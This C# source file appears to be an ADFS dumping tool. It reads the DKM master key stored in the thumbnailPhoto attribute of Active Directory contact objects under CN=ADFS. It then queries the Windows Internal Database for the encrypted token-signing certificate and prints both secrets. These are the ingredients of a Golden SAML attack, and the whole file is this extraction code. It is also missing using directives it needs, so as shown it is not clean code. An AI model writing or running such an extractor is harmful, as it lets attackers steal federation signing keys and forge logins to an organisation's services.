using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.DirectoryServices;
using System.Xml;
using System.Data.SqlClient;

namespace ADFS_Info
{
    class Program
    {
        static void GetPrivateKeys()
        {
            string searchString = "LDAP://";
            string domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
            string[] FQDNSplit = domain.Split('.');
            List<String> searchBase = new List<String> { "CN=ADFS", "CN=Microsoft", "CN=Program Data" };
            foreach (string DN in FQDNSplit)
            {
                searchBase.Add($"DC={DN}");
            }
            string SearchBase = $"{searchString}{string.Join(",", searchBase.ToArray())}";

            SearchResultCollection results;
            DirectoryEntry de = new DirectoryEntry(SearchBase);
            DirectorySearcher ds = new DirectorySearcher(de)
            {
                Filter = "(&(objectClass=contact)(!(cn=CryptoPolicy)))"
            };

            results = ds.FindAll();

            foreach (SearchResult sr in results)
            {

                if (sr.Properties["thumbnailPhoto"].Count > 0)
                {
                    byte[] privateKey = (byte[])sr.Properties["thumbnailphoto"][0];
                    string convertedPrivateKey = BitConverter.ToString(privateKey);
                    convertedPrivateKey = convertedPrivateKey.Replace("-", string.Empty);
                    Console.WriteLine("> Private Key.....................: {0}", convertedPrivateKey);
                    DateTime WhenCreated = (DateTime)sr.Properties["WhenCreated"][0];
                    Console.WriteLine("> When Created....................: {0}\n", WhenCreated);
                }
            }
        }

        public static string GetADFSVersion()
        {
            string GetADFSVersionServer = "";
            ManagementScope scope = new ManagementScope("\\\\localhost\\root/ADFS");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM SecurityTokenService");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (ManagementObject m in queryCollection)
            {
                string ADFSVersion = m["ConfigurationDatabaseConnectionString"].ToString();
                GetADFSVersionServer = Regex.Match(ADFSVersion, @"Catalog=(.+?);").Groups[1].Value;
            }
            return GetADFSVersionServer;
        }

        private static void GetCertificate()
        {
            string GetADFSVersionServer = GetADFSVersion();
            string connectionString = "server=\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query;trusted_connection=true;";
            using (SqlConnection connection = new SqlConnection())
            {
                connection.ConnectionString = connectionString;
                string queryString = $"SELECT ServiceSettingsData from {GetADFSVersionServer}.IdentityServerPolicy.ServiceSettings";
                connection.Open();
                SqlCommand command = new SqlCommand(queryString, connection);
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    string xmlString = (string)reader["ServiceSettingsData"];
                    XmlDocument xmlDocument = new XmlDocument();
                    xmlDocument.LoadXml(xmlString);
                    XmlElement root = xmlDocument.DocumentElement;
                    if (root.GetElementsByTagName("SigningToken")[0] is XmlElement signingToken)
                    {
                        XmlNode encryptedPfx = signingToken.GetElementsByTagName("EncryptedPfx")[0];
                        Console.WriteLine("> Encrypted Token Signing Key.....: {0}", encryptedPfx.InnerText);
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            GetPrivateKeys();
            GetCertificate();
        }
    }
}
